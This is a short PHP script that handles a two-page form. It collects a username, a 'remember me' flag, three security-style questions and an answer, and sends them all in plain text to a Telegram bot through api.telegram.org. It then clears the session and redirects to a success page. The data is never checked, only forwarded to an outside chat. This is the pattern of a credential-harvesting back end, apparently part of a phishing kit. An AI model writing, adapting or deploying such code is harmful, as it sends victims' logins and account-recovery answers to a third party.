<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve data from the second page form
    $question1 = $_POST["question1"];
    $question2 = $_POST["question2"];
    $question3 = $_POST["question3"];
    $answer = $_POST["answer"];

    // Retrieve data from the first page session
    $username = isset($_SESSION["username"]) ? $_SESSION["username"] : "N/A";
    $remember = isset($_SESSION["remember"]) ? $_SESSION["remember"] : false;

    // Perform any necessary validation

    // Send data to your Telegram bot (replace YOUR_BOT_TOKEN and YOUR_CHAT_ID with your actual values)
    $botToken = "YOUR_BOT_TOKEN";
    $chatID = "YOUR_CHAT_ID";
    $message = "Username: $username\nRemember Me: " . ($remember ? "Yes" : "No") . "\n";
    $message .= "Question 1: $question1\nQuestion 2: $question2\nQuestion 3: $question3\nAnswer: $answer";

    $telegramURL = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=" . urlencode($message);
    file_get_contents($telegramURL);

    // Clear session data
    session_unset();
    session_destroy();

    // Redirect to a success page or do something else
    header("Location: success_page.html");
    exit();
}
?>
